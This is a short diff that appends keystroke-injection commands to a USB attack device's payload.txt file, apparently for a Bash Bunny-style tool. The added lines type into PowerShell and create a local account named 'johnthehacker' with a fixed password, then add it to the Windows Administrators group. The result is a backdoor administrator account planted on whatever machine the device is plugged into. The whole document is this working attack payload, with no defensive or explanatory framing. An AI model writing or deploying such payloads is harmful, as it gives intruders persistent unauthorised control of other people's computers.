@@ -1,0 +1,8 @@
+#Append this to the payload.txt file before the LED FINISH line
+Q STRING "powershell"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q STRING 'net user johnthehacker SecRetPass123 /add; net localgroup "Administrators" johnthehacker /add'
+Q DELAY 500
+Q ENTER
